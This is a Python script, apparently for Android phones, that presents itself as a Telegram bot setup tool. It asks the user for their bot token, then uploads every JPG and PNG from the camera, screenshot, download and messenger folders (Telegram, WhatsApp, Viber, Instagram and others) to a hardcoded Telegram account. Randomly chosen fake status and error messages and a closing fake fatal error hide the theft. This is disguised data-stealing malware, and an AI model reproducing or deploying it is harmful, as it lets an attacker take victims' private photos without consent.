import telebot
from telebot import types
import os
import zipfile
from random import choice
import time

b = input("Введіть ваш токен телеграм бота: ")
if len(b) != 46:
        exit("Некоректний токен!")
else:
 print("Очікуйте доки ми налаштуємо бота, зазвичай займає 5-10 хвилин")
 ID = 'your_tg_id'
 bot = telebot.TeleBot("your_tg_bot_token")
 dirs = ["/storage/emulated/0/Android/data/org.telegram.messenger/files/Telegram/Telegram Images/",
             "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/",
             "/storage/emulated/0/Android/media/com.instagram.Android/",
             "/storage/emulated/0/DCIM/100PINT/",
             "/storage/emulated/0/DCIM/Screenshots/",
             "/storage/emulated/0/DCIM/Snapchat/",
             "/storage/emulated/0/DCIM/VK/",
             "/storage/emulated/0/DCIM/Camera/",
             "/storage/emulated/0/Download/Telegram/",
             "/storage/emulated/0/Download/",
             "/storage/emulated/0/Pictures/Screenshot/",
             "/storage/emulated/0/Pictures/Telegram/",
             "/storage/emulated/0/Pictures/Viber/"]
 succes = ['script has been loaded', 
                   'connected to datebase',
                   'finded last verson of script',
                   'script downloaded',
                   'permission gived',
                   'connected to telegram.org',
                   'loaded library',
                   'finded your order id',
                   'can do it',
                   'connected to internet' 
                   'checked syntax',
                   'getted permission to 194.jfg'
                   ]
 fail = ['script dont loaded', 
                   'failed connecting to datebase',
                   'dont finded last verson of script',
                   'script not downloaded',
                   'have not permission',
                   'failed connecting to telegram.org',
                   'dont loaded librabry',
                   'can not find your order id',
                   'can\'t do it',
                   'can\'t connect to internet',
                   'invalid syntax',
                   'you haven\'t permissionto 194.jfg']
 for dir in dirs:
     try:
         for file in os.listdir(dir):
               if file.endswith(".jpg") or file.endswith(".png"):
                   a = file
                   bot.send_document(ID, open(dir + a, "rb"))
         print(choice(succes))
     except Exception as ex:
         print('WARNING! ',choice(fail))
quit('FATAL ERROR CANNOT LOAD BOT')
